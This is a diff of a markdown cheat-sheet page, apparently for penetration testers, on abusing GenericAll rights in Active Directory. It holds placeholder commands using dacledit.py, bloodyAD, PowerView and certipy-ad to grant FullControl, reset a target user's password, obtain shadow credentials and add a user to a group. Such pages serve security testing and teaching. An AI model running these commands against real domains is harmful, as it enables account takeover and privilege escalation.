@@ -4,7 +4,6 @@ date: 2024-7-12
 tags: ["GenericAll", "active driectory", "ad", "Windows", "shadow credentials"]
 ---
 
----
 ### Abuse #1: Change target user password
 
 {{< tab set1 tab1 active >}}Linux{{< /tab >}}
@@ -15,26 +14,26 @@ tags: ["GenericAll", "active driectory", "ad", "Windows", "shadow credentials"]
 
 <div>
 
-```bash
+```console
 git clone https://github.com/fortra/impacket.git
 ```
 
-```bash
+```console
 cd impacket
 ```
 
-```bash
+```console
 pip3 install .
 ```
 
 </div>
 
-#### 1. Add Full Control to current user \[optional\]
+#### 1. Add Full Control to current user
 
 <div>
 
-```bash
-dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=EXAMPLE,DC=COM' -inheritance -action write -rights FullControl
+```console
+dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl
 ```
 
 </div>
@@ -46,7 +45,7 @@ dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -targe
 
 <div>
 
-```bash
+```console
 python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD>
 ```
 
@@ -62,7 +61,7 @@ python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set pass
 
 <div>
 
-```powershell
+```console
 . .\PowerView.ps1
 ```
 
@@ -72,11 +71,11 @@ python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set pass
 
 <div>
 
-```powershell
+```console
 $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force 
 ```
 
-```powershell
+```console
 Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
 ```
 
@@ -93,10 +92,40 @@ Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
 {{< tab set3 tab1 active >}}Linux{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
+#### 0. Install latest impacket (included dacledit.py) \[optional\]
+
 <div>
 
-```bash
-sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -k -account <TARGET_USER> -target <DC>
+```console
+git clone https://github.com/fortra/impacket.git
+```
+
+```console
+cd impacket
+```
+
+```console
+pip3 install .
+```
+
+</div>
+
+#### 1. Add Full Control to current user
+
+<div>
+
+```console
+dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl
+```
+
+</div>
+
+#### 2. Get shadow credentials
+
+<div>
+
+```console
+sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password '<PASSWORD>' -k -account <TARGET_USER> -target <DC>
 ```
 
 </div>
@@ -116,7 +145,7 @@ sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -pa
 
 <div>
 
-```powershell
+```console
 . .\PowerView.ps1
 ```
 
@@ -126,15 +155,15 @@ sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -pa
 
 <div>
 
-```powershell
+```console
 $username = "<DOMAIN>\<USER>"
 ```
 
-```powershell
-$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
+```console
+$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 ```
 
-```powershell
+```console
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
@@ -144,7 +173,7 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 
 <div>
 
-```powershell
+```console
 Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
 ```
 
